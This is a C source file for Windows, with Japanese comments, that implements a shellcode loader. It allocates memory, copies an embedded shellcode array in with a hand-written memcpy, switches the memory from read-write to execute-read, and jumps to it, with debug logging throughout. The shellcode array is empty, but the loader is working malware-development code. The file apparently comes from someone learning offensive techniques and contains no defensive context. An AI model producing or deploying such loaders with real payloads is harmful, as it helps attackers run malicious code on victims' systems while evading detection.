#include <windows.h>

#ifdef DEBUG
    #include <stdio.h>
    #define LOG(fmt, ...) printf("[DEBUG] " fmt "\n", ##__VA_ARGS__)
    // ...は可変引数
#else
    #define LOG(fmt, ...)
#endif
// gcc -DDEBUG main.c
// debug mode is enable

typedef unsigned long long size_t; //windows ではlongは4バイトでlong longは8バイト


const unsigned char shellcode[] = {};

DWORD old_protect;

void* origmemcpy(void *dest, const void *src, size_t n){
    unsigned char *d = (unsigned char*)dest;
    const unsigned char *s = (const unsigned char*)src;

    for(size_t i = 0; i < n; i++){
        d[i] = s[i];   
    }

    // 結果的に同じ位置のメモリに書き込まれる
    return dest;
}


int local_shellcode_exec(unsigned char *src, size_t size){
    void * mem = VirtualAlloc(
        NULL,
        size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if(mem == NULL){
        LOG("VirtualAlloc Failed: %lu", GetLastError());
        return -1;
    }
    LOG("VirtualAlloc succeeded: addr=%p size=%zu", mem, size);

    origmemcpy(mem, src, size);
    LOG("memcpy succeeded: src=%p dst=%p size=%zu", src, mem, size);


    if(!VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old_protect)){
    LOG("VirtualProtect failed: %lu", GetLastError());
    goto cleanup;
    }

    LOG("VirtualProtect succeeded: RW -> RX addr=%p", mem);

    LOG("executing shellcode at %p", mem);
    ((void(*)())mem)(); // voidの関数型にキャスト
    LOG("done!");

    cleanup:
        if(mem)VirtualFree(mem, 0, MEM_RELEASE);
        LOG("VirtualFree: addr=%p", mem);
    return 0;
}

int main(void){
    LOG("=== shellcode loader start ===");
    local_shellcode_exec(shellcode, sizeof(shellcode));
    // sizeofはsize_tを返す
    LOG("=== shellcode loader end ===");
    return 0;
}


